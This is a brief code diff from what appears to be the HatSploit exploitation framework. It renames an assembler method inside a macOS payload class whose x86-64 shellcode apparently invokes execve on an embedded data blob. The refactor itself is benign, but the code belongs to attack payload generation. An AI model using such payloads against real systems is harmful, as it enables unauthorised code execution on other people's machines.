@@ -35,13 +35,13 @@ class HatSploitPayload(Payload, MacOS):
         )
 
         return (
-            self.assemble(
+            self.__asm__(
                 """
                 start:
                     xor rax, rax
                     mov eax, 0x200003b
                 """,
-            ) + data + self.assemble(
+            ) + data + self.__asm__(
                 """
                 end:
                     mov rdi, [rsp]
